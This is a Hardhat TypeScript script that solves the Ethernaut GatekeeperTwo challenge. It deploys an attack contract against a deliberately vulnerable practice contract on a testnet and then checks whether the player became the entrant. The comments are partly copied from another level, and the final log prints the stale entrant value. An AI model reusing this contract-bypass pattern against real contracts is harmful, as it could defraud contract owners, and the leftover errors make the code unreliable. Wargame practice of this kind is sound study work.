import { ethers } from "hardhat";
// import { expect } from "chai";
// import { Wallet } from "ethers";
// import { HardhatRuntimeEnvironment } from "hardhat/types";
// import deployContract from "../deploy/deployGeneric";
import { run } from "hardhat";

const attackVault = async () => {
    // change contract addresses here.
    const gateTwoAddress = process.env.GATEKEEPERTWO!; //type "await contract.address()" in ethernaut console
    // const player = ""; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [gateTwoAddress];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the king
    // Additional read to understand more on recieve and transfer to make the contract needed:
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses

    // checking entrant here
    console.log("Checking entrant...");
    const ABI = [
        {
            inputs: [],
            name: "entrant",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, gateTwoAddress);
    let entrant = await contract.entrant();
    console.log(`Current entrant is: ${entrant}`);

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackGateKeeperTwo", args);
    // alternative below
    console.log("Deploying attack contract AttackGateKeeperTwo...");
    console.log("This will trigger constructor to register Player address as entrant...");
    const attack = await (
        await ethers.getContractFactory("AttackGateKeeperTwo", player)
    ).deploy(gateTwoAddress);
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (attackGateKeeperTwo.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const players = new ethers.Wallet(player, provider);
    console.log("Player's address is: ", players.address);

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    console.log("Rechecking entrant...");
    const newEntrant = await contract.entrant();
    console.log(`New entrant is: ${entrant}`);
    if (newEntrant === players.address) {
        console.log("Congrats! Level passed since player is now the entrant, Submit to ethernaut.");
    } else {
        console.log("entrant is not player, review code above and try again...");
    }
};

attackVault()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
